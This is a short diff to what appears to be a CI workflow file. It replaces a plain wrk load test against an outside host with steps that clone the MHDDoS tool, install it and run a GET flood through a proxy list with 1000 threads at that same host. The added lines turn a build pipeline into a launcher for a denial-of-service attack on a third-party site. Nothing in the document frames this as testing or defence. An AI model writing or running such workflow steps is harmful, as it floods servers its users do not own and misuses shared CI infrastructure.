@@ -9,5 +9,7 @@ jobs:
     runs-on: ubuntu-24.04-arm
     steps:
       - run: |
-          sudo apt-get install -y wrk
-          wrk -t4 -c750 -d60s http://lscf.eu.cc/
+          git clone https://github.com/MatrixTM/MHDDoS.git
+          cd MHDDoS
+          pip install -r requirements.txt
+          python start.py GET http://lscf.eu.cc/ 0 1000 all.txt 60 1000 true
